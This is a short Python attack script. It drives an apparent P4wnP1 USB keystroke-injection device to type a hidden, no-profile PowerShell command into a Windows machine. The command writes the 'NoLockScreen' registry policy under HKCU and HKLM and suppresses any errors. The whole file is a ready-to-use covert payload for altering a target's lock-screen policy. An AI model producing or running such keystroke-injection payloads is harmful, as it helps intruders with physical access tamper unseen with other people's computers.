#!/usr/bin/env python3
import subprocess

# Tries HKCU (no admin) and HKLM (admin). Disables lock screen on Win10/11.
PS = r'''
try{
 New-Item -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Force|Out-Null
 New-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Name "NoLockScreen" -Value 1 -PropertyType DWord -Force|Out-Null
}catch{}
try{
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Force|Out-Null
 New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Name "NoLockScreen" -Value 1 -PropertyType DWord -Force|Out-Null
}catch{}
'''

def main():
    cmd = 'powershell -w hidden -nop -c "' + PS.replace('"','\\"').replace("\n"," ") + '"'
    subprocess.run(["python3","/opt/p4wnp1/tools/inject_hid.py", cmd + "\n"], check=True)

if __name__ == "__main__":
    main()

